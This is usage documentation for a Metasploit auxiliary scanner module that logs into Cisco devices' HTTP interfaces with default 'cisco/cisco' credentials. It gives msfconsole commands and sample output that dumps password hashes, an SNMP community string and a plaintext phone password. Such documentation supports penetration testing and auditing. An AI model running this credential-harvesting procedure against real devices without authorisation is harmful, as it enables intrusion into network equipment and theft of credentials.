## Description

  This module scans for the presence of the HTTP interface for a cisco device and attempts to enumerate it using basic authentication.

## Vulnerable Application

  Any Cisco networking device with the HTTP inteface turned on.

## Verification Steps

  1. Enable the web interface on a cisco device `ip http server`
  2. Start msfconsole
  3. Do: ```use auxiliary/scanner/http/cisco_device_manager```
  4. Do: ```set RHOSTS [IP]```
  5. Do: ```run```

## Options

  **HttpUsername**

  Username to use for basic authentication.  Default value is `cisco`

  **HttpPassword**

  Password to use for basic authentication.  Default value is `cisco`

## Scenarios

### Tested on Cisco UC520-8U-4FXO-K9 running IOS 12.4

  ```
  msf5 > use auxiliary/scanner/http/cisco_device_manager 
  msf5 auxiliary(scanner/http/cisco_device_manager) > set rhosts 2.2.2.2
  rhosts => 2.2.2.2
  msf5 auxiliary(scanner/http/cisco_device_manager) > set vebose true
  vebose => true
  msf5 auxiliary(scanner/http/cisco_device_manager) > run
  
  [+] 2.2.2.2:80 Successfully authenticated to this device
  [+] 2.2.2.2:80 Processing the configuration file...
  [+] 2.2.2.2:80 MD5 Encrypted Enable Password: $1$TF.y$3E7pZ2szVvQw5JG8SDjNa1
  [+] 2.2.2.2:80 Username 'cisco' with MD5 Encrypted Password: $1$DaqN$iP32E5WcOOui/H66R63QB0
  [+] 2.2.2.2:80 SNMP Community (RO): public
  [+] 2.2.2.2:80 ePhone Username 'phoneone' with Password: 111111
  [*] Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
  ```
